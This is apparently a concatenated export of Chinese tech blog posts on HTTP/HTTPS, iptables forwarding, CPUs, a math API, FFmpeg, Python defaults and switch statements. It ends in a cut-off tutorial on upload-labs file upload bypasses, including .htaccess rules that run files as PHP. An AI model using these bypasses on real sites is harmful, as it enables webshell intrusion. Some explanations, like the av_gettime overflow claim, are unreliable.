cookie Set-Cookie: UserID=itbilu; Max-Age=3600; Version=1 Status 通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。 Status: 200 OK Trailer Trailer用户说明传输中分块编码的编码信息 Trailer: Max-Forwards Transfer-Encoding 用表示实体传输给用户的编码形式。包括：chunked、compress、 deflate、gzip、identity。 Transfer-Encoding: chunked Upgrade 要求客户端升级到另一个高版本协议。 Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 Vary 告知下游的代理服务器，应当如何对以后的请求协议头进行匹配，以决定是否可使用已缓存的响应内容而不是重新从原服务器请求新的内容。 Vary: * Via 告知代理服务器的客户端，当前响应是通过什么途径发送的。 Via: 1.0 fred, 1.1 itbilu.com (nginx/1.6.3) Warning 一般性警告，告知在实体内容体中可能存在错误。 Warning: 199 Miscellaneous warning WWW-Authenticate 表示在请求获取这个实体时应当使用的认证模式。 WWW-Authenticate: Basic 七、HTTPS 1. 概念 HTTPS （全称：Hyper Text Transfer Protocol over SecureSocket Layer），是以安全为目标的 HTTP 通道，在HTTP的基础上通过传输加密和身份认证保证了传输过程的安全性 。\n2. 通信流程 HTTPS通信主要包括几个节点，发起请求、验证身份、协商秘钥、加密会话，具体流程如下（此例子只有客户端对服务端的单向验证）：\n客户端向服务端发起建立HTTPS请求： 客户端生成随机数R1 发送给服务端； 客户端告诉服务端自己支持哪些加密算法。 服务器向客户端发送数字证书: 服务端生成随机数R2; 从客户端支持的加密算法中选择一种双方都支持的加密算法（此算法用于后面的会话密钥生成）; 服务端生成把证书、随机数R2、会话密钥生成算法，一同发给客户端; 客户端验证数字证书，证书验证通过后客户端生成会话密钥（双向验证则此处客户端也会向服务器发送证书）: 验证证书的可靠性，先用CA的公钥解密被加密过后的证书,能解密则说明证书没有问题，然后通过证书里提供的摘要算法进行对数据进行摘要，然后通过自己生成的摘要与服务端发送的摘要比对; 验证证书合法性，包括证书是否吊销、是否到期、域名是否匹配，通过后则进行后面的流程; 获得证书的公钥、会话密钥生成算法、随机数R2; 生成一个随机数R3; 根据会话秘钥算法使用R1、R2、R3生成会话秘钥; 用服务端证书的公钥加密随机数R3并发送给服务端。 服务器生成会话密钥（双向验证此处服务端也会对客户端的证书验证）： 服务器用私钥解密客户端发过来的随机数R3； 根据会话秘钥算法使用R1、R2、R3生成会话秘钥。 客户端与服务端开始进行加密会话。 3. HTTPS 的优缺点 优点 使用 HTTPS 协议可认证用户和服务器，确保数据发送到正确的客户机和服务器； HTTPS 协议是由 SSL+HTTP构建的可进行加密传输、身份认证的网络协议，要比 HTTP安全，可防止数据在传输过程中被窃取、改变，确保数据的完整性； HTTPS 是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。 缺点 相同网络环境下，HTTPS 协议会使页面的加载时间延长近 50%，增加 10%到 20%的耗电。此外，HTTPS 协议还会影响缓存，增加数据开销和功耗； HTTPS 协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持等方面几乎起不到什么作用； 最关键的是，SSL 证书的信用链体系并不安全。特别是在某些国家可以控制 CA 根证书的情况下，中间人攻击一样可行； 成本增加：部署 HTTPS 后，因为 HTTPS 协议的工作要增加额外的计算资源消耗，例如 SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本。在大规模用户访问应用的场景下，服务器需要频繁地做加密和解密操作，几乎每一个字节都需要做加解密，这就产生了服务器成本。 ​\tReference：\n郭浩然. 网站安全之HTTPS优缺点分析 脚本之家在线工具 (jb51.net) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%BD%91%E7%BB%9C%E7%9F%A5%E8%AF%86%E5%85%A5%E9%97%A8/","title":"网络知识入门"},{"content":"网络资源服务测试 一、直连资源服务器 1 2 3 4 5 # 启动资源服务 python3 -m http.server 8081 # 访问资源服务 -\u0026gt; 成功 curl http://10.0.66.174:8081 二、访问 Server A 1. 访问 192 网段 1 2 3 4 5 6 7 8 # 配置 iptables 设置远程端口转发 10.0.66.96:8002 -\u0026gt; 10.0.66.174:8081 # DNAT：将目的地址替换为10.0.66.174:8081 iptables -t nat -A PREROUTING -d 10.0.66.96 -p tcp --dport 8002 -j DNAT --to-destination 10.0.66.174:8081 # SNAT：将源地址替换为10.0.66.96 iptables -t nat -A POSTROUTING -d 10.0.66.174 -p tcp --dport 8081 -j SNAT --to 10.0.66.96 # 访问服务器 A -\u0026gt; 成功 curl http://10.0.66.96:8002 2. 访问 100 网段 1 2 3 4 5 6 # 配置 iptables 设置远程端口转发 100.93.105.24:8002 -\u0026gt; 10.0.66.174:8081 iptables -t nat -A PREROUTING -d 100.93.105.24 -p tcp --dport 8002 -j DNAT --to-destination 10.0.66.174:8081 iptables -t nat -A POSTROUTING -d 10.0.66.174 -p tcp --dport 8081 -j SNAT --to 100.93.105.24 # 访问服务器 A -\u0026gt; 成功 curl http://100.93.105.24:8002 三、访问 Server B 1. Server A 和 B 通过物理网卡连接，访问192网段 1 2 3 4 5 6 7 8 9 10 # Server A：10.0.66.96:8002 -\u0026gt; 10.0.66.174:8081 iptables -t nat -A PREROUTING -d 10.0.66.96 -p tcp --dport 8002 -j DNAT --to-destination 10.0.66.174:8081 iptables -t nat -A POSTROUTING -d 10.0.66.174 -p tcp --dport 8081 -j SNAT --to 10.0.66.96 # Server B：10.0.66.247:8001 -\u0026gt; 10.0.66.96:8002 iptables -t nat -A PREROUTING -d 10.0.66.247 -p tcp --dport 8001 -j DNAT --to-destination 10.0.66.96:8002 iptables -t nat -A POSTROUTING -d 10.0.66.96 -p tcp --dport 8002 -j SNAT --to 10.0.66.247 # 访问服务器 B -\u0026gt; 成功 curl http://10.0.66.247:8001 2. Server A 和 B 通过 VPN 连接，访问100网段 1 2 3 4 5 6 7 8 9 10 # Server A：100.93.105.24:8002 -\u0026gt; 10.0.66.174:8081 iptables -t nat -A PREROUTING -d 100.93.105.24 -p tcp --dport 8002 -j DNAT --to-destination 10.0.66.174:8081 iptables -t nat -A POSTROUTING -d 10.0.66.174 -p tcp --dport 8081 -j SNAT --to 100.93.105.24 # Server B：100.88.225.73:8001 -\u0026gt; 100.93.105.24:8002 iptables -t nat -A PREROUTING -d 100.88.225.73 -p tcp --dport 8001 -j DNAT --to-destination 100.93.105.24:8002 iptables -t nat -A POSTROUTING -d 100.93.105.24 -p tcp --dport 8002 -j SNAT --to 100.88.225.73 # 访问服务器 B -\u0026gt; 成功 curl http://100.88.225.73:8001 3. Server A 和 B 通过 VPN 连接，访问 192 网段 1 2 3 4 5 6 7 8 9 10 11 # Server A：100.93.105.24:8002 -\u0026gt; 10.0.66.174:8081 iptables -t nat -A PREROUTING -d 100.93.105.24 -p tcp --dport 8002 -j DNAT --to-destination 10.0.66.174:8081 iptables -t nat -A POSTROUTING -d 10.0.66.174 -p tcp --dport 8081 -j SNAT --to 100.93.105.24 # Server B： iptables -t nat -A PREROUTING -d 10.0.66.247 -p tcp --dport 8001 -j DNAT --to-destination 100.93.105.24:8002 # 自动转换源地址 iptables -t nat -A POSTROUTING -o tailscale0 -j MASQUERADE # 访问服务器 B -\u0026gt; 成功 curl http://10.0.66.247:8001 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E7%BD%91%E7%BB%9C%E8%B5%84%E6%BA%90%E6%B5%8B%E8%AF%95/","title":"网络资源测试"},{"content":"微处理器基础知识 一、性能指标 字长： 计算机在同一时间内处理的一组二进制数称为一个计算机的 “字”，而这组二进制数的位数就是“字长”。 **运算速度：**指每秒钟所能执行的指令条数，一般用“百万条指令/ 秒”（MIPS）来描述。微机一般采用主频来描述运算速度。 **储存容量：**存储容量是衡量微型计算机中存储能力的一个指标，微型计算机中通常以字节为单位表示存储容量。 **外设拓展能力：**外部设备的配置及扩展能力主要指计算机系统连接各种外部设备的可能性、灵活性和适应性。 **软件配置：**软件配置情况直接影响微型计算机系统的使用和性能的发挥，软件的配置应该包括功能强、操作简单、又能满足应用要求的操作系统和丰富的应用软件。 二、计算机系统组成 组成 **硬件系统：**包括中央处理机、存储器和外部设备等 **软件系统：**是计算机的运行程序和相应的文档 硬件系统 冯 · 诺伊曼结构\ngraph LR A(输入设备) --\u0026gt; B(运算器) B --\u0026gt; C(控制器) C --\u0026gt; D(存储器) D --\u0026gt; E(输出设备) 微处理器内部结构解析 **算术逻辑部件ALU （Arithmetic Logic Unit）：**ALU是运算器的核心部件。它在控制器控制下对两个二进制数进行算术运算和逻辑运算。 **累加器A（Accumulator）：**简单地说，A用来保存被加数及两个数的和。加数存放在另外一个数据寄存器中。 **控制器CU（Control Unit）：**控制器是整个CPU的指挥控制中心。是计算机系统发布操作命令的部件，是计算机的指挥中心。所有的操作都是在控制器的控制下实现的。 **标志寄存器FR（Flag Register）：**标志寄存器是用来存放ALU运算结果的状态信息。通常是根据有关指令的运行结果由CPU自动设置的。 **寄存器组RS（Registers）：**寄存器是CPU内部重要的数据存储资源，是汇编程序员能直接使用的硬件资源之一。 1 2 3 MOV @Ri，A ；A →(Ri) MOV @Ri，direct\t；(direct) →(Ri) MOV @Ri，#data\t；data →(Ri) ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%BE%AE%E5%A4%84%E7%90%86%E5%99%A8%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","title":"微处理器基础知识"},{"content":"微信小程序API 概要 请求方式都为 POST！ HTTP 请求码为 400 时代表输入有误！ HTTP 请求码为为 200 时代表请求成功！ 1. 表达式转LaTex url: https://try-hard.cn/generate_latex\n1 2 3 { \u0026#34;exp\u0026#34;: \u0026#34;x^2\u0026#34; // 表达式 } 返回结果：\n2. 表达式计算 url: https://try-hard.cn/simple\n1 2 3 4 5 { \u0026#34;exp\u0026#34;: \u0026#34;1+10\u0026#34;, // 表达式 \u0026#34;args\u0026#34;: \u0026#34;\u0026#34;, // 暂不使用 \u0026#34;retain\u0026#34;: \u0026#34;2\u0026#34; // 结果保留位数 } 返回结果：\n3. 函数求导 url: https://try-hard.cn/derivative\n1 2 3 4 5 { \u0026#34;exp\u0026#34;: \u0026#34;x^2\u0026#34;, // 求导表达式 \u0026#34;var\u0026#34;: \u0026#34;x\u0026#34;, // 被求导变量 \u0026#34;order\u0026#34;: \u0026#34;1\u0026#34; // 阶数 } 返回结果：\n4. 积分求解 url: https://try-hard.cn/integral\n定积分\n1 2 3 4 5 6 { \u0026#34;exp\u0026#34;: \u0026#34;x^2*(1-x^2)^(1/2)\u0026#34;, // 被积表达式 \u0026#34;vars\u0026#34;: \u0026#34;x\u0026#34;, // 积分变量 \u0026#34;upper\u0026#34;: \u0026#34;1\u0026#34;, // 积分上限 \u0026#34;lower\u0026#34;: \u0026#34;-1\u0026#34; // 积分下限 } 返回结果：\n不定积分\n1 2 3 4 { \u0026#39;exp\u0026#39;: \u0026#39;x^k\u0026#39;, \u0026#39;vars\u0026#39;: \u0026#39;x\u0026#39; } 返回结果：\n5. 极限求取 url: https://try-hard.cn/limit\n1 2 3 4 5 6 { \u0026#34;exp\u0026#34;: \u0026#34;(asin(x)-atan(x))/(sin(x)-tan(x))\u0026#34;, // 求极限的式子 \u0026#34;var\u0026#34;: \u0026#34;x\u0026#34;, // 变量 \u0026#34;value\u0026#34;: 0, // 极限点 \u0026#34;symbol\u0026#34;: \u0026#34;\u0026#34; // 左侧逼近则为 -；右侧逼近则为 +；两侧逼近则为 空 } 返回结果：\n6. 解方程 url: https://try-hard.cn/solve\n1 2 3 4 { \u0026#34;exps\u0026#34;: [\u0026#34;x+1=y\u0026#34;, \u0026#34;x+2=5\u0026#34;], // 方程组 \u0026#34;vars\u0026#34;: [\u0026#34;x\u0026#34;, \u0026#34;y\u0026#34;] // 未知数 } 返回结果：\n7. 反函数求取 url: https://try-hard.cn/inverse\n1 2 3 4 { \u0026#34;exp\u0026#34;: \u0026#34;y=sin(x)\u0026#34;, // 函数表达式 \u0026#34;var\u0026#34;: \u0026#34;x\u0026#34; // 变量 } 返回结果：\n8. 泰勒级数展开 url: https://try-hard.cn/series\n1 2 3 4 5 6 { \u0026#34;exp\u0026#34;: \u0026#34;atan(x)\u0026#34;, // 函数 \u0026#34;var\u0026#34;: \u0026#34;x\u0026#34;, // 自变量 \u0026#34;point\u0026#34;: 0, // 展开点 \u0026#34;power\u0026#34;: 7 // 幂 } 返回结果：\n9. 因式分解 url: https://try-hard.cn/factor\n1 2 3 { \u0026#34;exp\u0026#34;: \u0026#34;x**3 - x**2 + x - 1\u0026#34; // 被分解的式子 } 返回结果：\n10. 多项式展开 url: https://try-hard.cn/expand\n1 2 3 { \u0026#34;exp\u0026#34;: \u0026#34;(x + 1)**2\u0026#34; // 被展开的式子 } 返回结果：\n11. 合并同类项 url: https://try-hard.cn/collect\n1 2 3 4 { \u0026#34;exp\u0026#34;: \u0026#34;x*y + x - 3 + 2*x**2 - z*x**2 + x**3\u0026#34;, // 表达式 \u0026#34;var\u0026#34;: \u0026#34;x\u0026#34; // 要合并的自变量 } 返回结果：\n12. 有理分式化简 url: https://try-hard.cn/cancel\n1 2 3 { \u0026#34;exp\u0026#34;: \u0026#34;(x**2 + 2*x + 1)/(x**2 + x)\u0026#34; // 表达式 } 返回结果：\n13. 部分分式展开 url: https://try-hard.cn/apart\n1 2 3 { \u0026#34;exp\u0026#34;: \u0026#34;(4*x**3 + 21*x**2 + 10*x + 12)/(x**4 + 5*x**3 + 5*x**2 + 4*x)\u0026#34; // 表达式 } 返回结果：\n14. 阶乘计算 url: https://try-hard.cn/factorial\n1 2 3 { \u0026#34;num\u0026#34;: 4 // 阶数 } 返回结果：\n15. 求和式计算 **url：**https://try-hard.cn/summation\n1 2 3 4 5 6 { \u0026#34;exp\u0026#34;: \u0026#34;1/2^i\u0026#34;, // 表达式 \u0026#34;var\u0026#34;: \u0026#34;i\u0026#34;, // 自变量 \u0026#34;start\u0026#34;: \u0026#34;0\u0026#34;, // 起始值 \u0026#34;end\u0026#34;: \u0026#34;oo\u0026#34; // 结束值 } 返回结果：\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F-api/","title":"微信小程序 API"},{"content":"为什么 av_gettime() 返回值有正有负？ 前言 av_gettime() 这个函数在 FFmpeg 的开发中，进行帧处理时最常用的一个函数。但是自己在最开始理解这个函数的时候，发现这个函数返回值十分的神奇。\n因为它的 返回值有时是一个正值，有时又是一个负值！\n为了解开这个神奇的现象，自己研究了半天，最后才发现原来是这么一回事 \u0026hellip;\u0026hellip;\n示例 代码\n1 2 3 4 5 6 7 8 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;libavutil/time.h\u0026gt; int main(int argc, char const *argv[]) { printf(\u0026#34;%d\\n\u0026#34;, av_gettime()); return 0; } 运行\n1 gcc -o demo demo.c -w -L /usr/local/lib -lavutil \u0026amp;\u0026amp; ./demo 现象 运行之后会打印一个正的十位数（或者是负的十位数），等待一段时间后再运行时你就可能会发现打印的是一个负的十位数（或者正的十位数）。\n函数声明 想要解决这个问题，我们就需要回归到函数中去：\n1 2 3 4 /** * Get the current time in microseconds. */ int64_t av_gettime(void) 函数声明中我们得到了两个信息：\n功能：以微秒为单位获取当前时间 返回值：int64_t 分析 那么当前时间的返回值为多少呢？\n获取当前时间\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; int main() { struct timeval tv; gettimeofday(\u0026amp;tv, NULL); printf(\u0026#34;second: %ld\\n\u0026#34;, tv.tv_sec); // 秒 printf(\u0026#34;millisecond: %ld\\n\u0026#34;, tv.tv_sec * 1000 + tv.tv_usec / 1000); // 毫秒 printf(\u0026#34;microsecond: %ld\\n\u0026#34;, tv.tv_sec * 1000000 + tv.tv_usec); // 徽秒 } 对比打印结果发现我们这个程序微秒的返回值为一个16位的数字！\n原因 这个时候我们就已经可以知道原因了： av_gettime() 返回值为 int64_t，16位的时间戳数字对于它来说已经超出了它的最大表示值了，因此就会出现为负值的现象。\n心得 以后其他地方如果也出现了负值，那我们就可以考虑是不是范围问题了。 涉及到数字的操作时一定要考虑选择的数据类型的范围，以及不同平台下某些数据类型范围不一样的问题。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%B8%BA%E4%BB%80%E4%B9%88-av_gettime-%E8%BF%94%E5%9B%9E%E5%80%BC%E6%9C%89%E6%AD%A3%E6%9C%89%E8%B4%9F/","title":"为什么 av_gettime() 返回值有正有负？"},{"content":"为什么 Python 默认参数必须用不可变对象？ 话不多说，上代码：\n1 2 3 4 5 6 7 8 9 10 def fun(x, A=[], B=\u0026#39;\u0026#39;): C = [] A.append(x) B = B + x C.append(x) print(f\u0026#34;A:{A} B:{B} C:{C}\u0026#34;) fun(\u0026#39;1\u0026#39;) fun(\u0026#39;2\u0026#39;) fun(\u0026#39;3\u0026#39;) 我们在这段代码中：\n定义了一个位置参数 x，一个一个默认参数 A，A 的默认值为空列表，另一个默认参数 B，B 的默认值为一个空字符串，在函数体中定义了一个变量 C，并也给 C 传递了一个空列表。\n大家猜猜函数执行会输出怎样一个结果？\n1 2 3 4 # 为了排版工整略微修改了一下输出样式 A:[\u0026#39;1\u0026#39;] B:1 C:[\u0026#39;1\u0026#39;] A:[\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;] B:2 C:[\u0026#39;2\u0026#39;] A:[\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;] B:3 C:[\u0026#39;3\u0026#39;] 大家猜到了这个结果了吗？猜到的朋友都是大佬，下面的内容就可以略过了。没有猜到的朋友也不要慌，毕竟这玩意儿有点坑。。。\n在解释这个结果之前，大家需要复习一下 Python 中可变对象和不可变对象这两个概念：\n可变对象：对象指向的内存中的值会改变，当更改这个变量的时候，还是指向原来内存中的值，并且在原来的内存值进行原地修改，并没有开辟新的内存（list、dict、set）； 不可变对象：对象所指向的内存中的值不能被改变，当改变这个变量的时候，原来指向的内存中的值不变，变量不再指向原来的值，而是开辟一块新的内存，变量指向新的内存（int、float、str、tuple、bool、None）。 概念复习完了就开始进入正题了：\n在Python程序中，函数在被定义创建时，Python就会为默认参数分配一块儿空间。在这个程序中，为默认变量 A 分配了一个内存地址，其中的值为一个空列表，为 B 也分配了一块儿空间，值为空字符串：\n地址：0x0001 值：[] ==\u0026gt; A 地址：0x0002 值：\u0026#39;\u0026#39; ==\u0026gt; B Python 在调用函数时，会直接将在函数定义时得到的内存地址复制给默认参数！\n因此会在调用函数时出现下面的内存变化（内存地址为了方便看才排列这样有序的，实际程序里不可能这样）：\n当第一次调用函数时：\n1 2 3 4 5 6 # 调用开始时: A指向0x0001这个地址，B指向0x0002这个地址 C = [] # 对象C指向一个空列表 A.append(x)\t# 对象A指向的空列表（地址：0x0001）中添加了\u0026#39;1\u0026#39; B = B + x\t# 开辟了一块儿新内存，其中值为\u0026#39;1\u0026#39;，B不再指向\u0026#39;\u0026#39;（地址：0x0002）而指向\u0026#39;1\u0026#39; C.append(x)\t# 对象C指向的空列表中添加了\u0026#39;1\u0026#39; print(f\u0026#34;A:{A} B:{B} C:{C}\u0026#34;) # A:[\u0026#39;1\u0026#39;] B:\u0026#39;1\u0026#39; C:[\u0026#39;1\u0026#39;] 函数执行完后内存指向：\n地址：0x0001 值：[\u0026#39;1\u0026#39;] ==\u0026gt; A 地址：0x0002 值：\u0026#39;\u0026#39; 地址：0x0003 值：[\u0026#39;1\u0026#39;] ==\u0026gt; C 地址：0x0004 值：\u0026#39;1\u0026#39; ==\u0026gt; B 当第二次调用函数时：\n1 2 3 4 5 6 # 调用开始时: A指向0x0001这个地址，B指向0x0002这个地址 C = [] # 对象C指向一个空列表 A.append(x)\t# 对象A指向的空列表（地址：0x0001）中添加了\u0026#39;2\u0026#39; B = B + x\t# 开辟了一块儿新内存，其中值为\u0026#39;2\u0026#39;，B不再指向\u0026#39;\u0026#39;（地址：0x0002）而指向\u0026#39;2\u0026#39; C.append(x)\t# 对象C指向的空列表中添加了\u0026#39;2\u0026#39; print(f\u0026#34;A:{A} B:{B} C:{C}\u0026#34;) # A:[\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;] B:\u0026#39;2\u0026#39; C:[\u0026#39;2\u0026#39;] 函数执行完后内存指向：\n地址：0x0001 值：[\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;] ==\u0026gt; A 地址：0x0002 值：\u0026#39;\u0026#39; 地址：0x0003 值：[\u0026#39;2\u0026#39;] ==\u0026gt; C 地址：0x0004 值：\u0026#39;2\u0026#39; ==\u0026gt; B 当第三次调用函数时：\n1 2 3 4 5 6 # 调用开始时: A指向0x0001这个地址，B指向0x0002这个地址 C = [] # 对象C指向一个空列表 A.append(x)\t# 对象A指向的空列表（地址：0x0001）中添加了\u0026#39;3\u0026#39; B = B + x\t# 开辟了一块儿新内存，其中值为\u0026#39;3\u0026#39;，B不再指向\u0026#39;\u0026#39;（地址：0x0002）而指向\u0026#39;3\u0026#39; C.append(x)\t# 对象C指向的空列表中添加了\u0026#39;3\u0026#39; print(f\u0026#34;A:{A} B:{B} C:{C}\u0026#34;) # A:[\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;] B:\u0026#39;3\u0026#39; C:[\u0026#39;3\u0026#39;] 函数执行完后内存指向：\n地址：0x0001 值：[\u0026#39;1\u0026#39;, \u0026#39;2\u0026#39;, \u0026#39;3\u0026#39;] ==\u0026gt; A 地址：0x0002 值：\u0026#39;\u0026#39; 地址：0x0003 值：[\u0026#39;3\u0026#39;] ==\u0026gt; C 地址：0x0004 值：\u0026#39;3\u0026#39; ==\u0026gt; B 经过俺的这番讲解，朋友们你们学废了吗？\n为了避免以后在程序中出现莫名其妙的 Bug，大家要记住在 Python 程序中\n默认参数的值应该为不可变对象！！！\n默认参数的值应该为不可变对象！！！\n默认参数的值应该为不可变对象！！！\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%B8%BA%E4%BB%80%E4%B9%88-python-%E9%BB%98%E8%AE%A4%E5%8F%82%E6%95%B0%E5%BF%85%E9%A1%BB%E7%94%A8%E4%B8%8D%E5%8F%AF%E5%8F%98%E5%AF%B9%E8%B1%A1/","title":"为什么 Python 默认参数必须用不可变对象？"},{"content":"为什么 switch 语句执行效率比 if-else 语句高？ 在我们学习流程控制语句时不难发现，很多情况下能使用 if-else 语句的地方我们都能够使用 switch 语句来代替。\n有经验的开发者会建议我们，尽量使用 switch 语句来代替繁琐的 if-else。\n这样做的原因：switch 语句的执行效率会比 if-else 语句高。\n下面我们就写一个简单的程序来对其进行验证：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 public class Demo { public static void main(String[] args) { String aaa = \u0026#34;aaa\u0026#34;; long t1 = System.nanoTime(); if(\u0026#34;a\u0026#34;.equals(aaa)){ System.out.println(aaa); } else if (\u0026#34;b\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;c\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;d\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;e\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;f\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;g\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;h\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;i\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;j\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;k\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;l\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;m\u0026#34;.equals(aaa)) { System.out.println(aaa); } else if (\u0026#34;n\u0026#34;.equals(aaa)) { System.out.println(aaa); } else { System.out.println(aaa); } long t2 = System.nanoTime(); System.out.println(\u0026#34;if 语句执行时间:　\u0026#34; + (t2 - t1)); //switch语句测试代码： long tt1 = System.nanoTime(); switch (aaa) { case \u0026#34;a\u0026#34;: System.out.println(aaa); break; case \u0026#34;b\u0026#34;: System.out.println(aaa); break; case \u0026#34;c\u0026#34;: System.out.println(aaa); break; case \u0026#34;d\u0026#34;: System.out.println(aaa); break; case \u0026#34;e\u0026#34;: System.out.println(aaa); break; case \u0026#34;f\u0026#34;: System.out.println(aaa); break; case \u0026#34;g\u0026#34;: System.out.println(aaa); break; case \u0026#34;h\u0026#34;: System.out.println(aaa); break; case \u0026#34;i\u0026#34;: System.out.println(aaa); break; case \u0026#34;j\u0026#34;: System.out.println(aaa); break; case \u0026#34;k\u0026#34;: System.out.println(aaa); break; case \u0026#34;l\u0026#34;: System.out.println(aaa); break; case \u0026#34;m\u0026#34;: System.out.println(aaa); break; case \u0026#34;n\u0026#34;: System.out.println(aaa); break; default: System.out.println(aaa); break; } long tt2 = System.nanoTime(); System.out.println(\u0026#34;switch 语句执行时间:　\u0026#34; + (tt2 - tt1)); } } 输出：\naaa if 语句执行时间:　201300 aaa switch 语句执行时间:　18200 我们可以发现在这个程序中，swicth 语句的执行时间仅仅只有 if-else 语句的二十分之一。\n从这个程序就足以体现出 switch 语句的高效性。\n那么为什么 switch 语句会比 if-else 语句高效的这么多呢？\n这是因为编译器在处理 switch 语句时，会生成一个跳转表，然后根据值之间进行跳转。然而对于 if-else 语句，编译器需要一个一个进行比较，直到找到结果。\n从数据结构与算法的角度来看，switch 语句相当于一个数组，其查询时间复杂度为 O(1)；而 if-lese 语句相当于一个链表，其时间复杂度为 O(n)。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/%E4%B8%BA%E4%BB%80%E4%B9%88-switch-%E8%AF%AD%E5%8F%A5%E6%AF%94-if-else%E6%89%A7%E8%A1%8C%E6%95%88%E7%8E%87%E9%AB%98/","title":"为什么 switch 语句比 if-else执行效率高？"},{"content":"文件上传漏洞 概念 文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、修改头像、分享图片/视频等。正常的文件一般是文档、图片、视频等，Web应用收集之后放入后台存储，需要的时候再调用出来返回。\n如果恶意文件如PHP、ASP等执行文件绕过Web应用，并顺利执行，则相当于黑客直接拿到了Webshell，则可以拿到Web应用的数据，删除Web文件，本地提权，进一步拿下整个服务器甚至内网。\n一、验证与绕过 1. 前端 最常见的就是检测扩展名是否合法，有白名单形式也有黑名单形式。\n对于前端的验证，我们可以通过修改 JS 代码，或者通过抓包的方式绕过验证。\n实例：upload-labs —— Pass-01\n2. 服务端 1. MIME绕过 MIME(Multipurpose Internet Mail Extensions)：多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型。服务端MIME类型检测是通过检查http包的Content-Type字段中的值来判断上传文件是否合法的。\n绕过方式：\n通过抓包工具 Burp Suite 进行抓包，修改 Content-Type 字段的值为合法值。\nContent-Type 对照表\n数据类型 Content-Type(Mime-Type) 数据类型 Content-Type(Mime-Type) HTML text/html GIF image/gif 纯文本 text/plain jpg 图片 image/jpeg XML text/xml png 图片 image/png JSON application/json PDF application/pdf 二进制流数据（如常见的文件下载） application/octet-stream js application/x-javascript jsp text/html 实例：uploads-labs —— Pass-02\n2. 特殊解析后缀 一些特殊的后缀名有可能会被相应的服务器解析，在遇到检测文件后缀名的网站时，我们可以通过抓包修改后缀名的方式进行绕过。\nphp：php3、php4、php5、php7、phtml\njsp：jspx、jspf\nasp：asa、cer\n实例：uploads-labs —— Pass-03\n3. 上传 .htaccess 文件 .htaccess文件(或者\u0026quot;分布式配置文件\u0026quot;）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。\n概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：\n网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。\n假如我们自定义一个规则，并让服务器运行我们定义的规则，便可绕过上传限制。\nhtaccess 文件写法一：\nAddType application/x-httpd-php .后缀名 # 创建相同后缀名的一句话木马，作用就是会让这个后缀名变成php代码执行 htaccess 文件写法二：\n# FileMatch 参数即为文件名的正则匹配 \u0026lt;FilesMatch \u0026#34;xxxx\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; ​\t实例：uploads-labs —— Pass-04\n4. 大小写绕过 当服务器没有使用 strtolower() 函数将文件名全部变成小写进行检测时，就可以通过大小写进行绕过检测。\n如：.PHP .Php .PHp 等等\n​\t实例：uploads-labs —— Pass-05\n5. 空格绕过 Windows 系统会自动去掉后缀名最后的空格，或者服务端不存在 trim($file_name) 用以删除文件名后面的空格，就那么可以通过在文件名后面加空格进行绕过。\n​\t实例：uploads-labs —— Pass-07\n6. ::$DATA绕过 